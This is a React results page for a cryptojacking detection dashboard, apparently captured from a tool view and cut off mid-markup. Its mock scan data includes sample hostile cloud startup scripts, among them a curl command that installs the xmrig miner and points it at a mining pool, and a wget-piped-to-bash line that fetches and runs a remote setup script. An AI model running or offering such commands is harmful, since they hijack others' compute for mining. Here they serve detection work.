import Link from 'next/link';

export default function ResultsPage() {
  // Mock data for scan results
  const scanResults = {
    scanId: 'scan-123',
    date: '2025-03-18',
    duration: '2m 34s',
    status: 'completed',
    summary: {
      total: 12,
      high: 3,
      medium: 5,
      low: 4
    },
    detections: [
      {
        id: 1,
        severity: 'HIGH',
        source: 'AWS EC2',
        itemType: 'UserData Script',
        score: 85,
        content: '#!/bin/bash\ncurl -s -L https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz | tar -xz\n./xmrig -o pool.minexmr.com:4444 -u 44ky1wy...',
        matches: [
          { match: 'xmrig', category: 'Miner Binary', weight: 10 },
          { match: 'pool.minexmr.com', category: 'Mining Pool', weight: 8 }
        ]
      },
      {
        id: 2,
        severity: 'HIGH',
        source: 'GCP Compute',
        itemType: 'Startup Script',
        score: 92,
        content: '#!/bin/bash\nwget -q -O - https://raw.githubusercontent.com/cryptopool/miner-setup/master/setup.sh | bash\n# Mining wallet: 3FsNSRRbmjyMkQbV7CuH6B...',
        matches: [
          { match: 'cryptopool', category: 'Mining Pool', weight: 8 },
          { match: 'miner-setup', category: 'Miner Setup', weight: 7 }
        ]
      },
      {
        id: 3,
        severity: 'MEDIUM',
        source: 'Azure VM',
        itemType: 'Extension Script',
        score: 65,
        content: '#!/bin/bash\napt-get update\napt-get install -y build-essential libssl-dev libcurl4-openssl-dev\ngit clone https://github.com/crypto/hidden-miner.git\ncd hidden-miner && ./build.sh',
        matches: [
          { match: 'hidden-miner', category: 'Suspicious Name', weight: 6 }
        ]
      },
      {
        id: 4,
        severity: 'LOW',
        source: 'Local System',
        itemType: 'Cron Job',
        score: 35,
        content: '*/15 * * * * /usr/local/bin/monitor-cpu --threads=4 --background',
        matches: [
          { match: 'monitor-cpu', category: 'Suspicious Name', weight: 3 }
        ]
      }
    ]
  };

  return (
    <div className="min-h-screen bg-gray-50 dark:bg-gray-900">
      {/* Navigation */}
      <nav className="bg-white dark:bg-gray-800 shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between h-16">
            <div className="flex">
              <div className="flex-shrink-0 flex items-center">
                <span className="text-xl font-bold text-blue-600 dark:text-blue-400">CryptoDetector</span>
              </div>
              <div className="hidden sm:ml-6 sm:flex sm:space-x-8">
                <Link href="/" className="border-transparent text-gray-500 dark:text-gray-300 hover:text-gray-700 dark:hover:text-white hover:border-gray-300 inline-flex items-center px-1 pt-1 border-b-2 text-sm font-medium">
                  Home
                </Link>
                <Link href="/dashboard" className="border-transparent text-gray-500 dark:text-gray-300 hover:text-gray-700 dark:hover:text-white hover:border-gray-300 inline-flex items-center px-1 pt-1 border-b-2 text-sm font-medium">
                  Dashboard
                </Link>
                <Link href="/scan" className="border-transparent text-gray-500 dark:text-gray-300 hover:text-gray-700 dark:hover:text-white hover:border-gray-300 inline-flex items-center px-1 pt-1 border-b-2 text-sm font-medium">
                  Scan
                </Link>
                <Link href="/results" className="border-blue-500 text-gray-900 dark:text-white inline-flex items-center px-1 pt-1 border-b-2 text-sm font-medium">
                  Results
                </Link>
              </div>
            </div>
          </div>
        </div>
      </nav>

      {/* Results Content */}
      <div className="py-10">
        <header>
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <h1 className="text-3xl font-bold text-gray-900 dark:text-white">Scan Results</h1>
          </div>
        </header>
        <main>
          <div className="max-w-7xl mx-auto sm:px-6 lg:px-8">
            {/* Scan Metadata */}
            <div className="px-4 py-5 sm:px-0">
              <div className="bg-white dark:bg-gray-800 shadow overflow-hidden sm:rounded-lg">
                <div className="px-4 py-5 sm:px-6">
                  <h3 className="text-lg leading-6 font-medium text-gray-900 dark:text-white">
                    Scan Information
                  </h3>
                  <p className="mt-1 max-w-2xl text-sm text-gray-500 dark:text-gray-400">
                    Details about the cryptojacking detection scan.
                  </p>
                </div>
                <div className="border-t border-gray-200 dark:border-gray-700 px-4 py-5 sm:p-0">
                  <dl className="sm:divide-y sm:divide-gray-200 sm:dark:divide-gray-700">
                    <div className="py-4 sm:py-5 sm:grid sm:grid-cols-3 sm:gap-4 sm:px-6">
                      <dt className="text-sm font-medium text-gray-500 dark:text-gray-400">
                        Scan ID
                      </dt>
                      <dd className="mt-1 text-sm text-gray-900 dark:text-white sm:mt-0 sm:col-span-2">
                        {scanResults.scanId}
                      </dd>
                    </div>
                    <div className="py-4 sm:py-5 sm:grid sm:grid-cols-3 sm:gap-4 sm:px-6">
                      <dt className="text-sm font-medium text-gray-500 dark:text-gray-400">
                        Date
                      </dt>
                      <dd className="mt-1 text-sm text-gray-900 dark:text-white sm:mt-0 sm:col-span-2">
                        {scanResults.date}
                      </dd>
                    </div>
                    <div className="py-4 sm:py-5 sm:grid sm:grid-cols-3 sm:gap-4 sm:px-6">
                      <dt className="text-sm font-medium text-gray-500 dark:text-gray-400">
                        Duration
                      </dt>
                      <dd className="mt-1 text-sm text-gray-900 dark:text-white sm:mt-0 sm:col-span-2">
                        {scanResults.duration}
                      </dd>
                    </div>
                    <div className="py-4 sm:py-5 sm:grid sm:grid-cols-3 sm:gap-4 sm:px-6">
                      <dt className="text-sm font-medium text-gray-500 dark:text-gray-400">
                        Status
                      </dt>
                      <dd className="mt-1 text-sm text-gray-900 dark:text-white sm:mt-0 sm:col-span-2">
                        <span className="px-2 inline-flex text-xs leading-5 font-semibold rounded-full bg-green-100 text-green-800 dark:bg-green-800 dark:text-green-100">
                          {scanResults.status.toUpperCase()}
                        </span>
                      </dd>
                    </div>
                  </dl>
                </div>
              </div>
            </div>

            {/* Summary and Charts */}
            <div className="mt-8 px-4 sm:px-0">
              <div className="grid grid-cols-1 gap-5 sm:grid-cols-2">
                {/* Summary Card */}
                <div className="bg-white dark:bg-gray-800 overflow-hidden shadow rounded-lg">
                  <div className="px-4 py-5 sm:p-6">
                    <h3 className="text-lg leading-6 font-medium text-gray-900 dark:text-white">Summary</h3>
                    <div className="mt-5 grid grid-cols-2 gap-5">
                      <div className="bg-gray-50 dark:bg-gray-700 overflow-hidden shadow rounded-lg">
                        <div className="px-4 py-5 sm:p-6">
                          <dl>
                            <dt className="text-sm font-medium text-gray-500 dark:text-gray-400 truncate">
                              Total Detections
                            </dt>
                            <dd className="mt-1 text-3xl font-semibold text-gray-900 dark:text-white">
                              {scanResults.summary.total}
                            </dd>
                          </dl>
                        </div>
                      </div>
                      <div className="bg-red-50 dark:bg-red-900/20 overflow-hidden shadow rounded-lg">
                        <div className="px-4 py-5 sm:p-6">
                          <dl>
                            <dt className="text-sm font-medium text-red-800 dark:text-red-300 truncate">
                              High Severity
                            </dt>
                            <dd className="mt-1 text-3xl font-semibold text-red-800 dark:text-red-300">
                              {scanResults.summary.high}
                            </dd>
                          </dl>
                        </div>
                      </div>
                      <div className="bg-yellow-50 dark:bg-yellow-900/20 overflow-hidden shadow rounded-lg">
                        <div className="px-4 py-5 sm:p-6">
                          <dl>
                            <dt className="text-sm font-medium text-yellow-800 dark:text-yellow-300 truncate">
                              Medium Severity
                            </dt>
                            <dd className="mt-1 text-3xl font-semibold text-yellow-800 dark:text-yellow-300">
                              {scanResults.summary.medium}
                            </dd>
                          </dl>
                        </div>
                      </div>
                      <div className="bg-blue-50 dark:bg-blue-900/20 overflow-hidden shadow rounded-lg">
                        <div className="px-4 py-5 sm:p-6">
                          <dl>
                            <dt className="text-sm font-medium text-blue-800 dark:text-blue-300 truncate">
                              Low Severity
                            </dt>
                            <dd className="mt-1 text-3xl font-semibold text-blue-800 dark:text-blue-300">
                              {scanResults.summary.low}
                            </dd>
                          </dl>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Severity Distribution Chart */}
                <div className="bg-white dark:bg-gray-800 overflow-hidden shadow rounded-lg">
                  <div className="px-4 py-5 sm:p-6">
                    <h3 className="text-lg leading-6 font-medium text-gray-900 dark:text-white">Severity Distribution</h3>
                    <div className="mt-5 flex items-center justify-center">
                      {/* Placeholder for Pie Chart */}
                      <div className="relative w-48 h-48 rounded-full overflow-hidden">
                        <div className="absolute inset-0 bg-red-500" style={{ clipPath: `polygon(50% 50%, 100% 50%, 100% 0, 0 0, 0 50%)` }}></div>
                        <div className="absolute inset-0 bg-yellow-500" style={{ clipPath: `polygon(50% 50%, 0 50%, 0 100%, 100% 100%, 100% 50%)` }}></div>
                        <div className="absolute inset-0 bg-blue-500" style={{ clipPath: `polygon(50% 50%, 100% 50%, 100% 100%, 50% 100%)` }}></div>
                        <div className="absolute inset-0 flex items-center justify-center">
                          <div className="bg-white dark:bg-gray-800 rounded-full w-24 h-24 flex items-center justify-center">
                            <span className="text-lg font-bold text-gray-900 dark:text-white">{scanResults.summary.total}</span>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div className="mt-4 grid grid-cols-3 gap-2 text-sm">
                      <div className="flex items-center">
                        <span className="w-3 h-3 bg-red-500 rounded-full mr-2"></span>
                        <span className="text-gray-700 dark:text-gray-300">High: {scanResults.summary.high}</span>
                      </div>
                      <div className="flex items-center">
                        <span className="w-3 h-3 bg-yellow-500 rounded-full mr-2"></span>
                        <span className="text-gray-700 dark:text-gray-300">Medium: {scanResults.summary.medium}</span>
                      </div>
                      <div className="flex items-center">
                        <span className="w-3 h-3 bg-blue-500 rounded-full mr-2"></span>
                        <span className="text-gray-700 dark:text-gray-300">Low: {scanResults.summary.low}</span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Detection Results */}
            <div className="mt-8 px-4 sm:px-0">
              <div className="bg-white dark:bg-gray-800 shadow overflow-hidden sm:rounded-lg">
                <div className="px-4 py-5 sm:px-6 flex justify-between items-center">
                  <div>
                    <h3 className="text-lg leading-6 font-medium text-gray-900 dark:text-white">Detection Results</h3>
                    <p className="mt-1 max-w-2xl text-sm text-gray-500 dark:text-gray-400">
                      Detailed findings from the cryptojacking detection scan.
                    </p>
                  </div>
                  <div className="flex space-x-3">
                    <button className="inline-flex items-center px-4 py-2 border border-transparent text-sm font-medium rounded-md shadow-sm text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">
                      Export PDF
                    </button>
                    <button className="inline-flex items-center px-4 py-2 border border-gray-300 text-sm font-medium rounded-md shadow-sm text-gray-700 bg-white hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 dark:bg-gray-700 dark:text-gray-300 dark:border-gray-600 dark:hover:bg-gray-600">
                      Export CSV
                    </button>
                  </div>
                </div>
                <div className="border-t border-gray-200 dark:border-gray-700">
                  {/* Filter Controls */}
                  <div className="px-4 py-3 bg-gray-50 dark:bg-gray-700 sm:px-6">
                    <div className="flex space-x-2">
                      <button className="inline-flex items-center px-2.5 py-1.5 border border-transparent text-xs font-medium rounded text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">
                        All
                      </button>
                      <button className="inline-flex items-center px-2.5 py-1.5 border border-gray-300 text-xs font-medium rounded text-gray-700 bg-white hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 dark:bg-gray-800 dark:text-gray-300 dark:border-gray-600 dark:hover:bg-gray-700">
                        High
                      </button>
                      <button className="inline-flex items-center px-2.5 py-1.5 border border-gray-300 text-xs font-medium rounded text-gray-700 bg-white hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 dark:bg-gray-800 dark:text-gray-300 dark:border-gray-600 dark:hover:bg-gray-700">
                        Medium
                      </button>
                      <button className="inline-flex items-center px-2.5 py-1.5 border border-gray-300 text-xs font-medium rounded text-gray-700 bg-white hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 dark:bg-gray-800 dark:text-gray-300 dark:border-gray-600 dark:hover:bg-gray-700">
                        Low
                      </but<response clipped><NOTE>To save on context only part of this file has been shown to you. You should retry this tool after you have searched inside the file with `grep -n` in order to find the line numbers of what you are looking for.</NOTE>